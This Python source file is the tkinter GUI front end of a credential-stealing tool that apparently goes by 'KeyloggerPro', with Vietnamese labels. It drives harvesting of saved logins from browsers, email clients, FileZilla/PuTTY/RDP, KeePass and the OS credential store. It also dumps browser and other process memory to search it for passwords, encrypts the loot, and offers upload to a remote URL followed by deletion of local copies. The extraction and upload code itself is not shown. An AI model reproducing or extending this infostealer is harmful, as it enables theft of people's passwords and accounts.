# gui/frames/credentials_frame.py

import tkinter as tk
from tkinter import ttk, filedialog, messagebox
import os
import threading
import time
from datetime import datetime
import json


class CredentialsFrame:
    def __init__(self, parent, callback=None):
        self.parent = parent
        self.callback = callback
        self.frame = ttk.Frame(parent, padding=10)
        self.running = False
        self.create_widgets()

    def get_frame(self):
        return self.frame
        
    def create_widgets(self):
        """Tạo các thành phần giao diện"""
        
        # Notebook cho 2 tab: Credential Harvester và Memory Dump
        self.notebook = ttk.Notebook(self)
        self.notebook.pack(fill="both", expand=True)
        
        # Tab Credential Harvester
        self.cred_frame = ttk.Frame(self.notebook, padding=10)
        self.notebook.add(self.cred_frame, text="Thu thập thông tin đăng nhập")
        
        # Tab Memory Dump
        self.dump_frame = ttk.Frame(self.notebook, padding=10)
        self.notebook.add(self.dump_frame, text="Trích xuất bộ nhớ")
        
        # Thiết lập các widget cho tab Credential Harvester
        self._setup_credential_tab()
        
        # Thiết lập các widget cho tab Memory Dump
        self._setup_memory_dump_tab()
        
    def _setup_credential_tab(self):
        """Thiết lập giao diện cho tab Credential Harvester"""
        
        # Frame chứa cấu hình
        config_frame = ttk.LabelFrame(self.cred_frame, text="Cấu hình", padding=10)
        config_frame.pack(fill="x", padx=5, pady=5)
        
        # Thư mục đầu ra
        ttk.Label(config_frame, text="Thư mục lưu kết quả:").grid(row=0, column=0, sticky="w", pady=2)
        
        output_frame = ttk.Frame(config_frame)
        output_frame.grid(row=0, column=1, sticky="ew", pady=2)
        
        self.cred_output_var = tk.StringVar(value=os.path.join(os.path.expanduser("~"), "Documents", "KeyloggerPro", "credentials"))
        self.cred_output_entry = ttk.Entry(output_frame, textvariable=self.cred_output_var, width=40)
        self.cred_output_entry.pack(side="left", fill="x", expand=True)
        
        self.cred_browse_btn = ttk.Button(output_frame, text="...", width=3, command=self._browse_cred_output)
        self.cred_browse_btn.pack(side="left", padx=5)
        
        # Tùy chọn mã hóa
        self.cred_encrypt_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(config_frame, text="Mã hóa dữ liệu trích xuất", variable=self.cred_encrypt_var).grid(row=1, column=0, columnspan=2, sticky="w", pady=2)
        
        # Lựa chọn các mục trích xuất
        sources_frame = ttk.LabelFrame(self.cred_frame, text="Nguồn dữ liệu", padding=10)
        sources_frame.pack(fill="x", padx=5, pady=5)
        
        # Trình duyệt
        self.browser_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(sources_frame, text="Trình duyệt web (Chrome, Firefox, Edge, ...)", 
                       variable=self.browser_var).grid(row=0, column=0, sticky="w", pady=2)
        
        # Ứng dụng email
        self.email_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(sources_frame, text="Ứng dụng email (Outlook, Thunderbird, ...)", 
                       variable=self.email_var).grid(row=1, column=0, sticky="w", pady=2)
        
        # Ứng dụng kết nối
        self.connection_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(sources_frame, text="Ứng dụng kết nối (FileZilla, PuTTY, RDP, ...)", 
                       variable=self.connection_var).grid(row=2, column=0, sticky="w", pady=2)
        
        # Trình quản lý mật khẩu
        self.pwmanager_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(sources_frame, text="Trình quản lý mật khẩu (KeePass, ...)", 
                       variable=self.pwmanager_var).grid(row=3, column=0, sticky="w", pady=2)
        
        # Credential Manager của hệ điều hành
        self.oscred_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(sources_frame, text="Credential Manager của hệ điều hành", 
                       variable=self.oscred_var).grid(row=4, column=0, sticky="w", pady=2)
        
        # Cấu hình nâng cao
        advanced_frame = ttk.LabelFrame(self.cred_frame, text="Tùy chọn nâng cao", padding=10)
        advanced_frame.pack(fill="x", padx=5, pady=5)
        
        # Tự động xóa sau khi tải lên
        self.auto_delete_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(advanced_frame, text="Tự động xóa dữ liệu sau khi tải lên", 
                       variable=self.auto_delete_var).grid(row=0, column=0, sticky="w", pady=2)
        
        # URL để tải lên
        ttk.Label(advanced_frame, text="URL tải lên (nếu có):").grid(row=1, column=0, sticky="w", pady=2)
        self.upload_url_var = tk.StringVar()
        ttk.Entry(advanced_frame, textvariable=self.upload_url_var, width=40).grid(row=1, column=1, sticky="ew", pady=2)
        
        # Frame cho các nút điều khiển
        control_frame = ttk.Frame(self.cred_frame)
        control_frame.pack(fill="x", padx=5, pady=10)
        
        # Nút Thu thập
        self.harvest_btn = ttk.Button(control_frame, text="Thu thập thông tin đăng nhập", 
                                    command=self._start_credential_harvester, 
                                    style="Accent.TButton", width=25)
        self.harvest_btn.pack(side="left", padx=5)
        
        # Nút Dừng
        self.stop_harvest_btn = ttk.Button(control_frame, text="Dừng", 
                                         command=self._stop_credential_harvester, 
                                         state="disabled", width=10)
        self.stop_harvest_btn.pack(side="left", padx=5)
        
        # Nút Mở thư mục kết quả
        self.open_folder_btn = ttk.Button(control_frame, text="Mở thư mục kết quả", 
                                        command=self._open_cred_output_folder, width=20)
        self.open_folder_btn.pack(side="right", padx=5)
        
        # Thanh trạng thái
        status_frame = ttk.Frame(self.cred_frame)
        status_frame.pack(fill="x", padx=5, pady=5)
        
        ttk.Label(status_frame, text="Trạng thái:").pack(side="left")
        self.cred_status_var = tk.StringVar(value="Sẵn sàng")
        ttk.Label(status_frame, textvariable=self.cred_status_var).pack(side="left", padx=5)
        
        # Thanh tiến trình
        self.cred_progress = ttk.Progressbar(self.cred_frame, orient="horizontal", mode="determinate")
        self.cred_progress.pack(fill="x", padx=5, pady=5)
        
        # Khu vực log
        log_frame = ttk.LabelFrame(self.cred_frame, text="Nhật ký")
        log_frame.pack(fill="both", expand=True, padx=5, pady=5)
        
        # Text widget để hiển thị log
        self.cred_log = tk.Text(log_frame, height=10, width=60, wrap="word")
        self.cred_log.pack(side="left", fill="both", expand=True)
        
        # Scrollbar
        cred_scrollbar = ttk.Scrollbar(log_frame, orient="vertical", command=self.cred_log.yview)
        cred_scrollbar.pack(side="right", fill="y")
        self.cred_log.config(yscrollcommand=cred_scrollbar.set)
        
        # Disable text widget để không cho phép sửa
        self.cred_log.config(state="disabled")
        
    def _setup_memory_dump_tab(self):
        """Thiết lập giao diện cho tab Memory Dump"""
        
        # Frame chứa cấu hình
        config_frame = ttk.LabelFrame(self.dump_frame, text="Cấu hình", padding=10)
        config_frame.pack(fill="x", padx=5, pady=5)
        
        # Thư mục đầu ra
        ttk.Label(config_frame, text="Thư mục lưu kết quả:").grid(row=0, column=0, sticky="w", pady=2)
        
        output_frame = ttk.Frame(config_frame)
        output_frame.grid(row=0, column=1, sticky="ew", pady=2)
        
        self.dump_output_var = tk.StringVar(value=os.path.join(os.path.expanduser("~"), "Documents", "KeyloggerPro", "memory_dumps"))
        self.dump_output_entry = ttk.Entry(output_frame, textvariable=self.dump_output_var, width=40)
        self.dump_output_entry.pack(side="left", fill="x", expand=True)
        
        self.dump_browse_btn = ttk.Button(output_frame, text="...", width=3, command=self._browse_dump_output)
        self.dump_browse_btn.pack(side="left", padx=5)
        
        # Tùy chọn mã hóa
        self.dump_encrypt_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(config_frame, text="Mã hóa dữ liệu dump", variable=self.dump_encrypt_var).grid(row=1, column=0, columnspan=2, sticky="w", pady=2)
        
        # Trích xuất metadata
        self.metadata_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(config_frame, text="Trích xuất metadata của tiến trình", variable=self.metadata_var).grid(row=2, column=0, columnspan=2, sticky="w", pady=2)
        
        # Phân tích tìm thông tin đăng nhập
        self.analyze_dump_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(config_frame, text="Phân tích tìm thông tin đăng nhập trong memory dump", variable=self.analyze_dump_var).grid(row=3, column=0, columnspan=2, sticky="w", pady=2)
        
        # Danh sách tiến trình
        process_frame = ttk.LabelFrame(self.dump_frame, text="Tiến trình", padding=10)
        process_frame.pack(fill="both", expand=True, padx=5, pady=5)
        
        # Frame cho danh sách và thanh cuộn
        list_frame = ttk.Frame(process_frame)
        list_frame.pack(side="left", fill="both", expand=True)
        
        # Tạo Treeview để hiển thị danh sách tiến trình
        columns = ("pid", "name", "username")
        self.process_tree = ttk.Treeview(list_frame, columns=columns, show="headings", height=10)
        
        # Định nghĩa các cột
        self.process_tree.heading("pid", text="PID")
        self.process_tree.heading("name", text="Tên tiến trình")
        self.process_tree.heading("username", text="Người dùng")
        
        self.process_tree.column("pid", width=60, anchor="center")
        self.process_tree.column("name", width=200)
        self.process_tree.column("username", width=150)
        
        self.process_tree.pack(side="left", fill="both", expand=True)
        
        # Thanh cuộn
        process_scrollbar = ttk.Scrollbar(list_frame, orient="vertical", command=self.process_tree.yview)
        process_scrollbar.pack(side="right", fill="y")
        self.process_tree.config(yscrollcommand=process_scrollbar.set)
        
        # Frame cho các nút tương tác với danh sách
        process_buttons_frame = ttk.Frame(process_frame)
        process_buttons_frame.pack(side="right", fill="y", padx=5)
        
        # Nút Làm mới danh sách
        self.refresh_btn = ttk.Button(process_buttons_frame, text="Làm mới danh sách", 
                                    command=self._refresh_process_list, width=20)
        self.refresh_btn.pack(pady=5)
        
        # Nút Dump tiến trình đã chọn
        self.dump_selected_btn = ttk.Button(process_buttons_frame, text="Dump tiến trình đã chọn", 
                                          command=self._dump_selected_process, width=20)
        self.dump_selected_btn.pack(pady=5)
        
        # Nút Dump tất cả trình duyệt
        self.dump_browsers_btn = ttk.Button(process_buttons_frame, text="Dump tất cả trình duyệt", 
                                          command=self._dump_all_browsers, width=20)
        self.dump_browsers_btn.pack(pady=5)
        
        # Bộ lọc tiến trình
        filter_frame = ttk.Frame(process_buttons_frame)
        filter_frame.pack(fill="x", pady=5)
        
        ttk.Label(filter_frame, text="Lọc:").pack(side="left")
        self.filter_var = tk.StringVar()
        filter_entry = ttk.Entry(filter_frame, textvariable=self.filter_var, width=15)
        filter_entry.pack(side="left", padx=2)
        
        # Áp dụng bộ lọc khi nhấn Enter
        filter_entry.bind("<Return>", lambda e: self._filter_processes())
        
        # Nút lọc
        ttk.Button(filter_frame, text="Lọc", command=self._filter_processes, width=5).pack(side="left", padx=2)
        
        # Thanh trạng thái
        status_frame = ttk.Frame(self.dump_frame)
        status_frame.pack(fill="x", padx=5, pady=5)
        
        ttk.Label(status_frame, text="Trạng thái:").pack(side="left")
        self.dump_status_var = tk.StringVar(value="Sẵn sàng")
        ttk.Label(status_frame, textvariable=self.dump_status_var).pack(side="left", padx=5)
        
        # Thanh tiến trình
        self.dump_progress = ttk.Progressbar(self.dump_frame, orient="horizontal", mode="determinate")
        self.dump_progress.pack(fill="x", padx=5, pady=5)
        
        # Khu vực log
        log_frame = ttk.LabelFrame(self.dump_frame, text="Nhật ký")
        log_frame.pack(fill="both", expand=True, padx=5, pady=5)
        
        # Text widget để hiển thị log
        self.dump_log = tk.Text(log_frame, height=6, width=60, wrap="word")
        self.dump_log.pack(side="left", fill="both", expand=True)
        
        # Scrollbar
        dump_scrollbar = ttk.Scrollbar(log_frame, orient="vertical", command=self.dump_log.yview)
        dump_scrollbar.pack(side="right", fill="y")
        self.dump_log.config(yscrollcommand=dump_scrollbar.set)
        
        # Disable text widget để không cho phép sửa
        self.dump_log.config(state="disabled")
        
        # Nút mở thư mục đầu ra
        ttk.Button(self.dump_frame, text="Mở thư mục kết quả", 
                 command=self._open_dump_output_folder, width=20).pack(anchor="e", padx=5, pady=5)
        
        # Load danh sách tiến trình khi mở tab
        self._refresh_process_list()
        
    def _browse_cred_output(self):
        """Hộp thoại chọn thư mục đầu ra cho Credential Harvester"""
        folder = filedialog.askdirectory(initialdir=self.cred_output_var.get())
        if folder:
            self.cred_output_var.set(folder)
            
    def _browse_dump_output(self):
        """Hộp thoại chọn thư mục đầu ra cho Memory Dump"""
        folder = filedialog.askdirectory(initialdir=self.dump_output_var.get())
        if folder:
            self.dump_output_var.set(folder)
            
    def _open_cred_output_folder(self):
        """Mở thư mục đầu ra của Credential Harvester"""
        folder = self.cred_output_var.get()
        if not os.path.exists(folder):
            os.makedirs(folder)
            
        if os.path.exists(folder):
            os.startfile(folder) if os.name == 'nt' else os.system(f'xdg-open "{folder}"')
        else:
            messagebox.showerror("Lỗi", f"Không thể mở thư mục: {folder}")
            
    def _open_dump_output_folder(self):
        """Mở thư mục đầu ra của Memory Dump"""
        folder = self.dump_output_var.get()
        if not os.path.exists(folder):
            os.makedirs(folder)
            
        if os.path.exists(folder):
            os.startfile(folder) if os.name == 'nt' else os.system(f'xdg-open "{folder}"')
        else:
            messagebox.showerror("Lỗi", f"Không thể mở thư mục: {folder}")
            
    def _update_cred_log(self, message):
        """Cập nhật log của Credential Harvester"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        log_entry = f"[{timestamp}] {message}\n"
        
        self.cred_log.config(state="normal")
        self.cred_log.insert("end", log_entry)
        self.cred_log.see("end")
        self.cred_log.config(state="disabled")
        
    def _update_dump_log(self, message):
        """Cập nhật log của Memory Dump"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        log_entry = f"[{timestamp}] {message}\n"
        
        self.dump_log.config(state="normal")
        self.dump_log.insert("end", log_entry)
        self.dump_log.see("end")
        self.dump_log.config(state="disabled")
        
    def _refresh_process_list(self):
        """Làm mới danh sách tiến trình"""
        try:
            import psutil
            
            # Xóa danh sách cũ
            for item in self.process_tree.get_children():
                self.process_tree.delete(item)
                
            # Lấy danh sách tiến trình
            for proc in psutil.process_iter(['pid', 'name', 'username']):
                try:
                    proc_info = proc.info
                    self.process_tree.insert("", "end", values=(
                        proc_info['pid'],
                        proc_info['name'],
                        proc_info['username'] or "N/A"
                    ))
                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                    pass
                    
            self._update_dump_log("Đã làm mới danh sách tiến trình")
            
        except Exception as e:
            self._update_dump_log(f"Lỗi khi làm mới danh sách tiến trình: {str(e)}")
            messagebox.showerror("Lỗi", f"Không thể làm mới danh sách tiến trình: {str(e)}")
            
    def _filter_processes(self):
        """Lọc danh sách tiến trình theo từ khóa"""
        filter_text = self.filter_var.get().lower()
        
        if not filter_text:
            self._refresh_process_list()
            return
            
        try:
            import psutil
            
            # Xóa danh sách cũ
            for item in self.process_tree.get_children():
                self.process_tree.delete(item)
                
            # Lấy danh sách tiến trình đã lọc
            for proc in psutil.process_iter(['pid', 'name', 'username']):
                try:
                    proc_info = proc.info
                    if (filter_text in str(proc_info['pid']).lower() or
                        filter_text in proc_info['name'].lower() or
                        (proc_info['username'] and filter_text in proc_info['username'].lower())):
                        
                        self.process_tree.insert("", "end", values=(
                            proc_info['pid'],
                            proc_info['name'],
                            proc_info['username'] or "N/A"
                        ))
                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                    pass
                    
            self._update_dump_log(f"Đã lọc danh sách tiến trình với từ khóa: {filter_text}")
            
        except Exception as e:
            self._update_dump_log(f"Lỗi khi lọc danh sách tiến trình: {str(e)}")
            
    def _start_credential_harvester(self):
        """Khởi động quá trình thu thập thông tin đăng nhập"""
        # Kiểm tra thư mục đầu ra
        output_dir = self.cred_output_var.get()
        if not output_dir:
            messagebox.showerror("Lỗi", "Vui lòng chọn thư mục đầu ra")
            return
            
        # Tạo thư mục đầu ra nếu chưa tồn tại
        if not os.path.exists(output_dir):
            try:
                os.makedirs(output_dir)
            except Exception as e:
                messagebox.showerror("Lỗi", f"Không thể tạo thư mục đầu ra: {str(e)}")
                return
                
        # Cập nhật UI
        self.harvest_btn.config(state="disabled")
        self.stop_harvest_btn.config(state="normal")
        self.cred_status_var.set("Đang thu thập...")
        self.cred_progress["value"] = 0
        self.running = True
        
        # Xóa log cũ
        self.cred_log.config(state="normal")
        self.cred_log.delete(1.0, "end")
        self.cred_log.config(state="disabled")
        
        self._update_cred_log("Bắt đầu quá trình thu thập thông tin đăng nhập")
        
        # Tạo khóa mã hóa nếu cần
        encryption_key = None
        if self.cred_encrypt_var.get():
            import os
            import base64
            encryption_key = base64.urlsafe_b64encode(os.urandom(32))
            self._update_cred_log("Đã tạo khóa mã hóa")
            
        # Khởi động thread để thu thập
        thread = threading.Thread(target=self._run_credential_harvester, 
                                args=(output_dir, encryption_key))
        thread.daemon = True
        thread.start()
        
    def _run_credential_harvester(self, output_dir, encryption_key):
        """
        Chạy quá trình thu thập thông tin đăng nhập trong thread riêng
        
        Args:
            output_dir (str): Thư mục đầu ra
            encryption_key (bytes): Khóa mã hóa (hoặc None)
        """
        try:
            from extractors.credential_harvester import CredentialHarvester
            
            # Tạo đối tượng CredentialHarvester
            harvester = CredentialHarvester(output_dir, encryption_key)
            
            # Cập nhật UI
            self._update_cred_log("Đã khởi tạo Credential Harvester")
            self.cred_progress["value"] = 10
            
            # Lấy các nguồn dữ liệu được chọn
            sources = []
            if self.browser_var.get():
                sources.append("browsers")
            if self.email_var.get():
                sources.append("email_clients")
            if self.connection_var.get():
                sources.append("connection_tools")
            if self.pwmanager_var.get():
                sources.append("password_managers")
            if self.oscred_var.get():
                sources.append("os_credentials")
                
            if not sources:
                self._update_cred_log("Không có nguồn dữ liệu nào được chọn")
                self._finalize_credential_harvester(None)
                return
                
            # Tiến hành thu thập từ các nguồn
            results = {}
            total_sources = len(sources)
            progress_per_source = 80 / total_sources  # 80% cho việc thu thập
            
            for i, source in enumerate(sources):
                if not self.running:
                    self._update_cred_log("Quá trình thu thập đã bị dừng")
                    self._finalize_credential_harvester(None)
                    return
                    
                self._update_cred_log(f"Đang thu thập từ {source}...")
                
                # Gọi phương thức tương ứng
                if source == "browsers":
                    results["browsers"] = harvester.harvest_browser_credentials()
                elif source == "email_clients":
                    results["email_clients"] = harvester.harvest_email_credentials()
                elif source == "connection_tools":
                    results["connection_tools"] = harvester.harvest_connection_credentials()
                elif source == "password_managers":
                    results["password_managers"] = harvester.harvest_password_manager_data()
                elif source == "os_credentials":
                    results["os_credentials"] = harvester.harvest_os_credentials()
                    
                # Cập nhật tiến trình
                progress = 10 + (i + 1) * progress_per_source
                self.cred_progress["value"] = progress
                
            # Lưu kết quả vào file JSON
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            result_file = os.path.join(output_dir, f"credentials_{timestamp}.json")
            
            with open(result_file, 'w') as f:
                json.dump(results, f, indent=4)
                
            self._update_cred_log(f"Đã lưu kết quả vào: {result_file}")
            
            # Mã hóa file kết quả nếu có key
            if encryption_key:
                self._update_cred_log("Đang mã hóa dữ liệu...")
                harvester._encrypt_file(result_file)
                self._update_cred_log("Đã mã hóa dữ liệu")
                
            # Tải lên nếu có URL
            upload_url = self.upload_url_var.get()
            if upload_url:
                self._update_cred_log("Đang tải lên máy chủ từ xa...")
                # Implement upload logic here
                self._update_cred_log("Đã tải lên máy chủ từ xa")
                
                # Xóa file nếu được chọn
                if self.auto_delete_var.get():
                    os.remove(result_file)
                    self._update_cred_log("Đã xóa dữ liệu cục bộ sau khi tải lên")
            
            self.cred_progress["value"] = 100
            self._update_cred_log("Hoàn tất quá trình thu thập")
            
            # Lưu khóa mã hóa nếu đã tạo
            if encryption_key:
                key_file = os.path.join(output_dir, f"encryption_key_{timestamp}.txt")
                with open(key_file, 'wb') as f:
                    f.write(encryption_key)
                self._update_cred_log(f"Đã lưu khóa mã hóa vào: {key_file}")
                self._update_cred_log("QUAN TRỌNG: Hãy lưu khóa này để có thể giải mã dữ liệu sau này")
                
            self._finalize_credential_harvester(result_file)
            
        except Exception as e:
            self._update_cred_log(f"Lỗi trong quá trình thu thập: {str(e)}")
            self._finalize_credential_harvester(None)
            
    def _finalize_credential_harvester(self, result_file):
        """
        Hoàn tất quá trình thu thập thông tin đăng nhập
        
        Args:
            result_file (str): Đường dẫn đến file kết quả hoặc None nếu thất bại
        """
        self.running = False
        self.harvest_btn.config(state="normal")
        self.stop_harvest_btn.config(state="disabled")
        
        if result_file:
            self.cred_status_var.set("Hoàn tất")
            messagebox.showinfo("Hoàn tất", f"Đã thu thập xong thông tin đăng nhập.\nKết quả được lưu tại: {result_file}")
        else:
            self.cred_status_var.set("Thất bại")
            
    def _stop_credential_harvester(self):
        """Dừng quá trình thu thập thông tin đăng nhập"""
        self.running = False
        self._update_cred_log("Đang dừng quá trình thu thập...")
        self.stop_harvest_btn.config(state="disabled")
        
    def _dump_selected_process(self):
        """Tiến hành dump tiến trình đã chọn"""
        # Lấy tiến trình đã chọn
        selected_items = self.process_tree.selection()
        if not selected_items:
            messagebox.showinfo("Thông báo", "Vui lòng chọn ít nhất một tiến trình để dump")
            return
            
        # Kiểm tra thư mục đầu ra
        output_dir = self.dump_output_var.get()
        if not output_dir:
            messagebox.showerror("Lỗi", "Vui lòng chọn thư mục đầu ra")
            return
            
        # Tạo thư mục đầu ra nếu chưa tồn tại
        if not os.path.exists(output_dir):
            try:
                os.makedirs(output_dir)
            except Exception as e:
                messagebox.showerror("Lỗi", f"Không thể tạo thư mục đầu ra: {str(e)}")
                return
                
        # Tạo khóa mã hóa nếu cần
        encryption_key = None
        if self.dump_encrypt_var.get():
            import os
            import base64
            encryption_key = base64.urlsafe_b64encode(os.urandom(32))
            self._update_dump_log("Đã tạo khóa mã hóa")
            
        # Lấy danh sách PID từ các tiến trình đã chọn
        pids = []
        for item in selected_items:
            values = self.process_tree.item(item, "values")
            pids.append(int(values[0]))  # PID là cột đầu tiên
            
        # Cập nhật UI
        self._update_dump_log(f"Bắt đầu dump {len(pids)} tiến trình")
        self.dump_status_var.set("Đang tiến hành dump...")
        self.dump_progress["value"] = 0
        
        # Vô hiệu hóa các nút
        self.refresh_btn.config(state="disabled")
        self.dump_selected_btn.config(state="disabled")
        self.dump_browsers_btn.config(state="disabled")
        
        # Khởi động thread để dump
        thread = threading.Thread(target=self._run_memory_dump, 
                                args=(output_dir, encryption_key, pids))
        thread.daemon = True
        thread.start()
        
    def _dump_all_browsers(self):
        """Tiến hành dump tất cả tiến trình trình duyệt"""
        # Kiểm tra thư mục đầu ra
        output_dir = self.dump_output_var.get()
        if not output_dir:
            messagebox.showerror("Lỗi", "Vui lòng chọn thư mục đầu ra")
            return
            
        # Tạo thư mục đầu ra nếu chưa tồn tại
        if not os.path.exists(output_dir):
            try:
                os.makedirs(output_dir)
            except Exception as e:
                messagebox.showerror("Lỗi", f"Không thể tạo thư mục đầu ra: {str(e)}")
                return
                
        # Tạo khóa mã hóa nếu cần
        encryption_key = None
        if self.dump_encrypt_var.get():
            import os
            import base64
            encryption_key = base64.urlsafe_b64encode(os.urandom(32))
            self._update_dump_log("Đã tạo khóa mã hóa")
            
        # Cập nhật UI
        self._update_dump_log("Bắt đầu dump các trình duyệt")
        self.dump_status_var.set("Đang tiến hành dump trình duyệt...")
        self.dump_progress["value"] = 0
        
        # Vô hiệu hóa các nút
        self.refresh_btn.config(state="disabled")
        self.dump_selected_btn.config(state="disabled")
        self.dump_browsers_btn.config(state="disabled")
        
        # Khởi động thread để dump browser
        thread = threading.Thread(target=self._run_browser_dump, 
                                args=(output_dir, encryption_key))
        thread.daemon = True
        thread.start()
        
    def _run_memory_dump(self, output_dir, encryption_key, pids):
        """
        Chạy quá trình dump memory trong thread riêng
        
        Args:
            output_dir (str): Thư mục đầu ra
            encryption_key (bytes): Khóa mã hóa (hoặc None)
            pids (list): Danh sách PID cần dump
        """
        try:
            from extractors.memory_dump import MemoryDumper
            
            # Tạo đối tượng MemoryDumper
            dumper = MemoryDumper(output_dir, encryption_key)
            
            # Biến để theo dõi số lượng dump thành công
            successful_dumps = 0
            total_pids = len(pids)
            
            # Dump từng tiến trình
            for i, pid in enumerate(pids):
                self._update_dump_log(f"Đang dump tiến trình {pid}...")
                
                # Tiến hành dump
                include_metadata = self.metadata_var.get()
                dump_file = dumper.dump_process_memory(pid, include_metadata)
                
                if dump_file:
                    successful_dumps += 1
                    self._update_dump_log(f"Đã dump tiến trình {pid} thành công: {dump_file}")
                    
                    # Phân tích tìm thông tin đăng nhập nếu được chọn
                    if self.analyze_dump_var.get():
                        self._update_dump_log(f"Đang phân tích dump {dump_file}...")
                        results = dumper.analyze_dump_for_credentials(dump_file)
                        
                        if results:
                            # Lưu kết quả phân tích
                            analysis_file = f"{dump_file}.credentials.json"
                            with open(analysis_file, 'w') as f:
                                json.dump(results, f, indent=4)
                                
                            # Mã hóa file kết quả nếu có key
                            if encryption_key:
                                dumper._encrypt_file(analysis_file)
                                
                            self._update_dump_log(f"Đã phân tích dump và tìm thấy {sum(len(v) for v in results.values())} kết quả")
                        else:
                            self._update_dump_log("Không tìm thấy thông tin đăng nhập trong dump")
                else:
                    self._update_dump_log(f"Không thể dump tiến trình {pid}")
                    
                # Cập nhật tiến trình
                progress = (i + 1) / total_pids * 100
                self.dump_progress["value"] = progress
                
            # Hoàn tất
            self._update_dump_log(f"Đã hoàn tất: {successful_dumps}/{total_pids} dump thành công")
            
            # Lưu khóa mã hóa nếu đã tạo
            if encryption_key:
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                key_file = os.path.join(output_dir, f"dump_encryption_key_{timestamp}.txt")
                with open(key_file, 'wb') as f:
                    f.write(encryption_key)
                self._update_dump_log(f"Đã lưu khóa mã hóa vào: {key_file}")
                self._update_dump_log("QUAN TRỌNG: Hãy lưu khóa này để có thể giải mã dữ liệu sau này")
                
            self._finalize_memory_dump(successful_dumps > 0)
            
        except Exception as e:
            self._update_dump_log(f"Lỗi trong quá trình dump: {str(e)}")
            self._finalize_memory_dump(False)
            
    def _run_browser_dump(self, output_dir, encryption_key):
        """
        Chạy quá trình dump memory của các trình duyệt
        
        Args:
            output_dir (str): Thư mục đầu ra
            encryption_key (bytes): Khóa mã hóa (hoặc None)
        """
        try:
            from extractors.memory_dump import MemoryDumper
            
            # Tạo đối tượng MemoryDumper
            dumper = MemoryDumper(output_dir, encryption_key)
            
            self._update_dump_log("Đang tìm các tiến trình trình duyệt...")
            
            # Tiến hành dump các trình duyệt
            dump_files = dumper.dump_browser_processes()
            
            if dump_files:
                self._update_dump_log(f"Đã dump {len(dump_files)} tiến trình trình duyệt thành công")
                
                # Phân tích tìm thông tin đăng nhập nếu được chọn
                if self.analyze_dump_var.get():
                    self._update_dump_log("Đang phân tích các dump...")
                    
                    for i, dump_file in enumerate(dump_files):
                        self._update_dump_log(f"Đang phân tích {os.path.basename(dump_file)}...")
                        results = dumper.analyze_dump_for_credentials(dump_file)
                        
                        if results:
                            # Lưu kết quả phân tích
                            analysis_file = f"{dump_file}.credentials.json"
                            with open(analysis_file, 'w') as f:
                                json.dump(results, f, indent=4)
                                
                            # Mã hóa file kết quả nếu có key
                            if encryption_key:
                                dumper._encrypt_file(analysis_file)
                                
                            self._update_dump_log(f"Đã phân tích dump và tìm thấy {sum(len(v) for v in results.values())} kết quả")
                        else:
                            self._update_dump_log("Không tìm thấy thông tin đăng nhập trong dump")
                            
                        # Cập nhật tiến trình
                        progress = (i + 1) / len(dump_files) * 100
                        self.dump_progress["value"] = progress
            else:
                self._update_dump_log("Không tìm thấy tiến trình trình duyệt nào để dump")
                
            # Lưu khóa mã hóa nếu đã tạo
            if encryption_key:
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                key_file = os.path.join(output_dir, f"dump_encryption_key_{timestamp}.txt")
                with open(key_file, 'wb') as f:
                    f.write(encryption_key)
                self._update_dump_log(f"Đã lưu khóa mã hóa vào: {key_file}")
                self._update_dump_log("QUAN TRỌNG: Hãy lưu khóa này để có thể giải mã dữ liệu sau này")
                
            self._finalize_memory_dump(len(dump_files) > 0)
            
        except Exception as e:
            self._update_dump_log(f"Lỗi trong quá trình dump trình duyệt: {str(e)}")
            self._finalize_memory_dump(False)
            
    def _finalize_memory_dump(self, success):
        """
        Hoàn tất quá trình dump memory
        
        Args:
            success (bool): True nếu ít nhất một dump thành công
        """
        # Cập nhật UI
        self.refresh_btn.config(state="normal")
        self.dump_selected_btn.config(state="normal")
        self.dump_browsers_btn.config(state="normal")
        
        if success:
            self.dump_status_var.set("Hoàn tất")
            self.dump_progress["value"] = 100
            messagebox.showinfo("Hoàn tất", "Đã tiến hành dump memory thành công.")
        else:
            self.dump_status_var.set("Thất bại")
            messagebox.showerror("Thất bại", "Không thể dump memory. Vui lòng kiểm tra nhật ký.")